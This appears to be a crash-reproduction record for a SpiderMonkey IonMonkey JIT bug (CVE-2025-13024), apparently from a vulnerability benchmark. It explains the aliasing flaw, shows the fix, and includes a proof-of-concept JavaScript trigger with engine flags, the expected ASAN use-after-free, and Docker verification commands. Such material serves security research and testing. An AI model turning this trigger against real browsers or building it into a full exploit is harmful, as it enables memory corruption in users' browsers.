# Bugzilla 1992902 / CVE-2025-13024

**Title:** Ion scalar-replacement of `TypedArray.prototype.subarray()` missed buffer-metadata GC side effect
**Severity:** sec-high (MFSA 2025-87, Firefox 145)
**Component:** SpiderMonkey — IonMonkey — `js/src/jit/{MIR.h,ScalarReplacement.cpp,WarpCacheIRTranspiler.cpp}`
**Fix commit:** `de49b52ff5f912aa3a7ea7c570ee1aafcde53fa6` (André Bargull, 2025-10-30, r=iain)
**Test commit:** `c5c8f75e3c8e6a4f03510096a4a1c7b564fe2aeb` (André Bargull, 2026-01-14, r=jandem)
**Vulnerable revision:** `de49b52ff5f912aa3a7ea7c570ee1aafcde53fa6~1`
**Reporter:** André Bargull.

## Summary

`MTypedArraySubarray` was declared with `alias_set: none` and
`can_recover: true`, so Ion treated every `subarray()` call as a pure,
hoistable operation with no observable side effects. But calling
`subarray()` on a `TypedArray` that still holds inline elements
**migrates** those elements into a freshly-allocated `ArrayBuffer` —
a GC-observable allocation that invalidates the parent array's inline
dense-elements pointer. Once Ion hoisted `subarray()` over aliased
element stores, the subsequent store landed on freed inline-elements
storage, producing a heap use-after-free.

## Fix

```cpp
// MIR.h — hand-written class with a scalarReplaced_ flag
class MTypedArraySubarray : public MAryInstruction<2>, public NoTypePolicy::Data {
  bool scalarReplaced_ = false;
 public:
  AliasSet getAliasSet() const override {
    return scalarReplaced_ ? AliasSet::None()
                           : AliasSet::Store(AliasSet::ObjectFields);
  }
  bool canRecoverOnBailout() const override { return scalarReplaced_; }
  void setScalarReplaced() { scalarReplaced_ = true; }
};

// WarpCacheIRTranspiler.cpp — emit as effectful with a resume-after
bool WarpCacheIRTranspiler::emitTypedArraySubarrayResult(...) {
  auto* ins = MTypedArraySubarray::New(alloc(), ...);
  addEffectful(ins);
  return resumeAfter(ins);
}

// ScalarReplacement.cpp — SubarrayReplacer now calls setScalarReplaced()
// and stealResumePoint() to preserve the deopt point once the node is
// promoted to a pure recoverable.
```

Until scalar replacement succeeds, the node advertises
`Store(ObjectFields)` so Ion cannot hoist it over subsequent element
writes. Only after `SubarrayReplacer` proves the migration is safe is
the node marked pure.

## Trigger (`poc.js`)

Adapted from the published jit-tests (`subarray-ensure-buffer.js`,
`subarray-ensure-buffer-metadata.js`). The test is Ion-sensitive — we
push `--ion-warmup-threshold=30` and run enough iterations for the
miscompiled loop to hit the freed inline-elements pointer under
`gczeal(2)`:

```js
gczeal(2);
function test() {
  var subarray;
  for (var i = 0; i < 1000; i++) {
    var arr = new Int32Array(2);
    arr[0] = 1;
    subarray = arr.subarray(1);
    arr[1] = 1;
  }
  return subarray;
}
for (var j = 0; j < 50; j++) test();
```

`command_options`: `--fuzzing-safe --ion-offthread-compile=off --ion-warmup-threshold=30`.

## Expected crash

ASAN **heap-use-after-free** on an `Int32Array` dense-elements pointer
reached from the Ion-compiled loop, surfacing as SEGV at
`js/src/gc/Nursery.cpp:972` in `IsWriteableAddress` (ASAN shadow check
on a pointer just freed by the inline→ArrayBuffer migration).

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:1992902 spidermonkey/1992902
bash spidermonkey/crash_check.sh 1992902
```

Expected: `CONFIMRED: ASAN_CRASH`.
